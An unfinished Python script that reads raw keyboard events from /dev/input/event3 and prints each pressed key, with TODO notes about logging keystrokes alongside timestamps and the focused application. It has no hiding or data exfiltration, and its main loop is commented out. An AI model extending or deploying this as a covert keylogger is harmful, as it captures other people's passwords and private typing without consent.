#!/usr/bin/env python3
import struct
import subprocess
import Xlib.display
import re

import time

"""
NOTE: Read from /dev/input/event3
    struct input_event {
      struct timeval time;
      unsigned short type;
      unsigned short code;
      unsigned int value;
    }
values for timeval, type, code and value are located in /usr/include/linux/input-event-codes.h
"""

#TODO: Look into the xlib module for getting current window in focus

#TODO: Find way to auto-detect the /dev/input/? event file for keyboard
#TODO: Add combination for Fn keys
#TODO: When recording keystrokes add date/time of keystrokes and also the application that
#      is currrently in focus
#TODO: Change value when there is shift combinatins, i.e 1 to !,
#      also figure out how to do this over multiple keyboard layouts
#TODO: Ensure works with different keyboard layouts, not just qwerty

#NOTE: 'input-event-codes' are american layout

'Goes through input-event-codes.h getting key codes'
def parse_input_event_codes():
    f = open("/usr/include/linux/input-event-codes.h", "r")
    f_data = f.readlines()
    f.close()

    key_consts = {}

    #parse data obtaining intial key-codes
    for line in f_data:
        if line[:11] != "#define KEY" and line[:11] != "#define BTN": continue

        #gets key code/value from constant
        const = re.sub(r"#define |[\n()]", "", line).replace("\t", " ").split(" ")
        const = [x for x in const if x]
        value, code = const[0], const[1]

        #converts code to int, leaves ref consts as strings ad it cant convert it to same value as another
        #constant because values are used as dict keys
        if code[:2] == "0x": code = int(code, 16)
        elif "_" not in code: code = int(code)
        key_consts[str(code)] = value

    return key_consts

' Changes key code values to ascii values, e.g. KEY_MINUS to -, and adds combinations dependant on the keyboard layout '
def key_code_to_ascii():
    pass

' Gets current state of caps lock and nums lock keys '
def get_capsnum_lock():
    res_out = run_process(["xset", "-q"])
    res = re.sub("[0123456789 ]", "", res_out).split("\n")[3].split(":")
    return [res[2], res[4]]

' Gets current keyboard layout, e.g UK, US, etc. '
def get_keyboard_layout():
    layout_line = run_process(["setxkbmap", "-query"]).split("\n")[2].split(":")
    return layout_line[1].split(",")[0].strip()

' Gets process of the window currrently in focus '
def get_focused_window():
    #TODO: Look into pytohn Xlib library
    pass

' Runs and returns process output '
def run_process(command):
    ps = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return ps.stdout.decode() if ps.stdout else ps.stderr.decode()

def main():
    form = "llHHI"
    e_size = struct.calcsize(form)
    key_butn_const = parse_input_event_codes()
    ctrl_shift = [0, 0]
    caps_num_lock = get_capsnum_lock()
    alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    combinations = ')!"£$%^&*('
    uk_combinations = {str(x):combinations[x] for x in range(10)}
    uk_combinations["MINUS"] = "_"
    uk_combinations["EQUAL"] = "+"

    try:
        f = open("/dev/input/event3", "rb")
        e = f.read(e_size)
        while e:
            caps_num_lock = get_capsnum_lock()
            (timeval1_, timeval2_, type_, code_, value_) = struct.unpack(form, e)
            key = key_butn_const[str(code_)].split("_")
            key = key[-1] if key[-1] in alph else key_butn_const[str(code_)]

            if type_ == 1:
                ctrl_shift[0] = value_ if "CTRL" in key else ctrl_shift[0]
                ctrl_shift[1] = value_ if "SHIFT" in key else ctrl_shift[1]

                if ctrl_shift[1] and caps_num_lock[0] == "on" and key in alph:
                    key = key.lower()
                if not ctrl_shift[1] and caps_num_lock[0] == "off" and key in alph:
                    key = key.lower()

                key = "CTRL_" + key if ctrl_shift[0] else key
                if ctrl_shift[1] and not ctrl_shift[0] and key.upper() not in alph:
                    try:
                        key = uk_combinations[key.split("_")[-1]]
                    except KeyError:
                        key = "SHIFT_" + key

                if value_ == 1 or value_ == 2:
                    print("KEY: {}".format(key))

            e = f.read(e_size)
    except (FileNotFoundError, PermissionError):
        raise Exception("Unable to access file required to read raw data, please ensure the file exists and that you have root access.")
    except KeyboardInterrupt: pass
    finally:f.close()

if __name__ == '__main__':
    #main()
    print(get_keyboard_layout())
